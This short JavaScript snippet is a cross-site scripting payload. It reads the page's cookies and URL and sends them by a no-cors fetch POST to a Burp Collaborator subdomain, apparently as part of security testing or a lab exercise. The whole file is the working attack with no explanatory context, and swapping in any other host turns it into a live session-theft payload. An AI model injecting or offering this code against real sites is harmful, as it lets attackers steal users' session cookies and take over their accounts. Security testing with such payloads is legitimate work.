const url = "https://zjmn4h1a5m0duiy5970oyugjva10pp.burpcollaborator.net"
const data = { cookies: document.cookie, url: window.location.href };

fetch(url, {
	method: "POST",
	mode: "no-cors",
	body: JSON.stringify(data),
	headers: {
		"Content-Type": "application/json"
	}
});
